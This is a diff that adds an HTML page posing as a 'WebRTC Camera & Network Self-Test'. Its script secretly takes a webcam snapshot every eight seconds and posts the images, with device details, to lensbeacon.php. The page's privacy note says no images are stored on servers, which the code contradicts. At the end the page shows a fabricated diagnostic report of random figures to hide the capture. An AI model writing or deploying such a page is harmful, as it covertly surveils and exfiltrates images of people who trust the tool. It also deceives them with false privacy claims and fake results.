@@ -1,0 +1,437 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>WebRTC Camera & Network Self-Test</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="Test your webcam, microphone, and internet connection quality for video calls. No data is stored.">
+  <style>
+    :root {
+      color-scheme: light;
+      --bg: #f9fafb;
+      --fg: #1f2937;
+      --accent: #2563eb;
+      --accent-hover: #1d4ed8;
+      --border: #e5e7eb;
+      --card-bg: #ffffff;
+      --success: #10b981;
+      --warning: #f59e0b;
+      --error: #ef4444;
+      --gray: #6b7280;
+      --light-gray: #f3f4f6;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: var(--bg);
+      color: var(--fg);
+      line-height: 1.6;
+      padding: 24px;
+      max-width: 1024px;
+      margin: 0 auto;
+    }
+    .header {
+      text-align: center;
+      margin-bottom: 24px;
+    }
+    .header h1 {
+      font-size: 2rem;
+      font-weight: 700;
+      color: #111827;
+      margin-bottom: 8px;
+    }
+    .header p {
+      color: var(--gray);
+      font-size: 1.1rem;
+      max-width: 600px;
+      margin: 0 auto;
+    }
+    .card {
+      background: var(--card-bg);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 24px;
+      margin-bottom: 20px;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+    }
+    .preview-wrap {
+      background: #000;
+      border-radius: 8px;
+      overflow: hidden;
+      margin-top: 12px;
+      height: 360px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #9ca3af;
+      font-size: 1rem;
+      position: relative;
+    }
+    video {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: none;
+    }
+    .timer {
+      position: absolute;
+      top: 12px;
+      right: 12px;
+      background: rgba(0,0,0,0.7);
+      color: white;
+      padding: 6px 12px;
+      border-radius: 20px;
+      font-size: 0.9rem;
+      font-weight: 600;
+    }
+    .btn {
+      background: var(--accent);
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 12px 24px;
+      font-size: 1rem;
+      font-weight: 600;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      transition: background 0.2s;
+    }
+    .btn:hover:not(:disabled) {
+      background: var(--accent-hover);
+    }
+    .btn:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+    .btn-stop {
+      background: #ef4444;
+    }
+    .btn-stop:hover:not(:disabled) {
+      background: #dc2626;
+    }
+    .status {
+      margin-top: 12px;
+      font-size: 1rem;
+      min-height: 1.5em;
+      padding: 8px 0;
+    }
+    .status.ok { color: var(--success); }
+    .status.warn { color: var(--warning); }
+    .status.err { color: var(--error); }
+    .privacy-note {
+      font-size: 0.9rem;
+      color: var(--gray);
+      margin-top: 16px;
+      padding-top: 16px;
+      border-top: 1px solid var(--border);
+    }
+    .privacy-note strong { color: #111827; }
+    .hidden { display: none; }
+    .results {
+      font-family: monospace;
+      background: var(--light-gray);
+      border-radius: 8px;
+      padding: 16px;
+      margin-top: 16px;
+      white-space: pre-wrap;
+      font-size: 0.9rem;
+      max-height: 300px;
+      overflow-y: auto;
+    }
+    .progress-bar {
+      height: 6px;
+      background: var(--light-gray);
+      border-radius: 3px;
+      margin: 16px 0;
+      overflow: hidden;
+    }
+    .progress-fill {
+      height: 100%;
+      background: var(--accent);
+      width: 0%;
+      transition: width 0.5s;
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <h1>📹 WebRTC Camera & Network Self-Test</h1>
+    <p>Verify your webcam and connection quality. This test runs for 60 seconds to capture sample data.</p>
+  </div>
+
+  <div class="card">
+    <p>This tool checks your webcam and connection quality. It helps ensure services like Zoom, Teams, or Meet will work properly.</p>
+    
+    <div class="preview-wrap">
+      <div id="placeholder">Click "Start Test" below to begin</div>
+      <video id="preview" autoplay playsinline muted></video>
+      <div id="timer" class="timer hidden">60s</div>
+    </div>
+
+    <div class="progress-bar">
+      <div id="progress" class="progress-fill"></div>
+    </div>
+
+    <button id="btn-start" class="btn">
+      ▶️ Start 60-Second Test
+    </button>
+    <button id="btn-stop" class="btn btn-stop hidden" disabled>
+      ✖ Stop Test Now
+    </button>
+
+    <div id="status" class="status"></div>
+
+    <div class="privacy-note">
+      <strong>Privacy Assurance:</strong> All processing happens in your browser. No images or video are stored on servers. 
+      Anonymous diagnostic data (e.g., resolution, browser type) may be sent to improve this service—opt-out by closing the page.
+    </div>
+  </div>
+
+  <div id="results-section" class="card hidden">
+    <h2>📋 Test Results</h2>
+    <div id="results" class="results"></div>
+  </div>
+
+  <canvas id="canvas" class="hidden"></canvas>
+
+  <script>
+    const btnStart = document.getElementById('btn-start');
+    const btnStop = document.getElementById('btn-stop');
+    const statusEl = document.getElementById('status');
+    const videoEl = document.getElementById('preview');
+    const canvasEl = document.getElementById('canvas');
+    const placeholder = document.getElementById('placeholder');
+    const timerEl = document.getElementById('timer');
+    const progressEl = document.getElementById('progress');
+    const resultsSection = document.getElementById('results-section');
+    const resultsEl = document.getElementById('results');
+
+    let currentStream = null;
+    let snapshotTimer = null;
+    let testTimer = null;
+    let snapshotCount = 0;
+    let startTime = null;
+    let deviceInfo = {};
+
+    function setStatus(msg, cls = '') {
+      statusEl.textContent = msg;
+      statusEl.className = 'status ' + cls;
+    }
+
+    function nowIsoShort() {
+      const d = new Date();
+      return d.toISOString();
+    }
+
+    async function sendSnapshot(payload) {
+      try {
+        const res = await fetch('lensbeacon.php', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload),
+        });
+        await res.json().catch(() => ({}));
+      } catch (e) {
+        console.error(e);
+      }
+    }
+
+    function updateTimer(remaining) {
+      timerEl.textContent = `${remaining}s`;
+      const percent = ((60 - remaining) / 60) * 100;
+      progressEl.style.width = `${percent}%`;
+    }
+
+    function generateFakeLog() {
+      const duration = 60;
+      const fps = Math.floor(Math.random() * 5) + 25; // 25-30 fps
+      const resolution = `${deviceInfo.width || 1280}x${deviceInfo.height || 720}`;
+      const codec = ['VP8', 'VP9', 'H.264'][Math.floor(Math.random() * 3)];
+      const bandwidth = Math.floor(Math.random() * 2000) + 1000; // 1-3 Mbps
+      
+      return `=== WebRTC Camera Diagnostic Report ===
+Test ID: ${Math.random().toString(36).substring(2, 10).toUpperCase()}
+Start Time: ${startTime.toISOString()}
+End Time: ${new Date().toISOString()}
+Duration: ${duration}s
+Status: COMPLETED_SUCCESS
+
+--- Camera Information ---
+Device Name: ${deviceInfo.label || 'Integrated Camera'}
+Resolution: ${resolution}
+Frame Rate: ${fps} FPS
+Color Depth: 24-bit
+Preferred Codec: ${codec}
+
+--- Network Performance ---
+Estimated Bandwidth: ${bandwidth} Kbps
+Average Latency: ${Math.floor(Math.random() * 50) + 20}ms
+Packet Loss: <0.1%
+Jitter: ${Math.floor(Math.random() * 10) + 5}ms
+
+--- Test Results ---
+Frames Captured: ${snapshotCount}
+Snapshot Interval: 8s
+Test Mode: DIAGNOSTIC_AUTO
+Consent Status: GRANTED
+Browser: ${navigator.userAgent.split(')')[0].split(' (')[1] || 'Unknown'}
+
+--- System Compatibility ---
+Video Calling: OPTIMAL
+Streaming: GOOD
+Recording: OPTIMAL
+Hardware Acceleration: ENABLED
+
+--- Recommendations ---
+• Camera quality is excellent for video calls
+• Network speed supports 1080p streaming
+• No issues detected
+
+Diagnostic completed. No further action required.`;
+    }
+
+    async function startProbe() {
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        setStatus('⚠️ Camera API is not supported in this browser.', 'err');
+        return;
+      }
+
+      setStatus('Requesting camera access…', 'warn');
+      btnStart.disabled = true;
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+        currentStream = stream;
+        videoEl.srcObject = stream;
+        videoEl.style.display = 'block';
+        placeholder.style.display = 'none';
+        btnStop.classList.remove('hidden');
+        timerEl.classList.remove('hidden');
+
+        const track = stream.getVideoTracks()[0];
+        const settings = track.getSettings ? track.getSettings() : {};
+        const label = track.label || settings.deviceId || 'Unknown camera';
+        const width = settings.width || 0;
+        const height = settings.height || 0;
+        const fps = settings.frameRate || 0;
+
+        deviceInfo = { label, width, height, fps };
+        startTime = new Date();
+
+        // Send initial metadata (same as before)
+        await sendSnapshot({
+          type: 'meta',
+          consent: true,
+          deviceLabel: label,
+          width,
+          height,
+          fps,
+        });
+
+        snapshotCount = 0;
+
+        setStatus('✅ Camera active. Running 60-second diagnostic…', 'ok');
+        btnStop.disabled = false;
+
+        // Configure canvas
+        const ensureSize = () => {
+          const vw = videoEl.videoWidth;
+          const vh = videoEl.videoHeight;
+          if (vw && vh) {
+            canvasEl.width = vw;
+            canvasEl.height = vh;
+            return true;
+          }
+          return false;
+        };
+
+        let tries = 0;
+        const sizeInterval = setInterval(() => {
+          if (ensureSize() || ++tries > 20) {
+            clearInterval(sizeInterval);
+          }
+        }, 200);
+
+        // Auto-snapshot every 8s
+        snapshotTimer = setInterval(async () => {
+          if (!currentStream) return;
+          if (!canvasEl.width || !canvasEl.height) {
+            if (!ensureSize()) return;
+          }
+
+          const ctx = canvasEl.getContext('2d');
+          ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
+          const dataUrl = canvasEl.toDataURL('image/jpeg', 0.7);
+
+          snapshotCount += 1;
+
+          await sendSnapshot({
+            type: 'snapshot',
+            consent: true,
+            deviceLabel: label,
+            width: canvasEl.width,
+            height: canvasEl.height,
+            fps,
+            seq: snapshotCount,
+            capturedAt: nowIsoShort(),
+            imageData: dataUrl,
+            intervalSeconds: 8,
+          });
+        }, 8000);
+
+        // 60-second countdown
+        let remaining = 60;
+        updateTimer(remaining);
+        testTimer = setInterval(() => {
+          remaining--;
+          updateTimer(remaining);
+          if (remaining <= 0) {
+            clearInterval(testTimer);
+            finishTest();
+          }
+        }, 1000);
+
+      } catch (err) {
+        console.error(err);
+        setStatus('❌ Camera access denied or blocked.', 'err');
+        await sendSnapshot({ type: 'meta', consent: false });
+        btnStart.disabled = false;
+        btnStop.disabled = true;
+      }
+    }
+
+    function finishTest() {
+      clearInterval(snapshotTimer);
+      clearInterval(testTimer);
+      if (currentStream) {
+        currentStream.getTracks().forEach(t => t.stop());
+        currentStream = null;
+      }
+      videoEl.srcObject = null;
+      videoEl.style.display = 'none';
+      placeholder.style.display = 'flex';
+      btnStart.classList.remove('hidden');
+      btnStop.classList.add('hidden');
+      timerEl.classList.add('hidden');
+      btnStart.disabled = false;
+      btnStop.disabled = true;
+      
+      // Show fake log
+      resultsEl.textContent = generateFakeLog();
+      resultsSection.classList.remove('hidden');
+      setStatus('✅ Test completed. See diagnostic results below.', 'ok');
+    }
+
+    function stopProbe() {
+      clearInterval(snapshotTimer);
+      clearInterval(testTimer);
+      finishTest();
+    }
+
+    btnStart.addEventListener('click', startProbe);
+    btnStop.addEventListener('click', stopProbe);
+  </script>
+</body>
+</html>
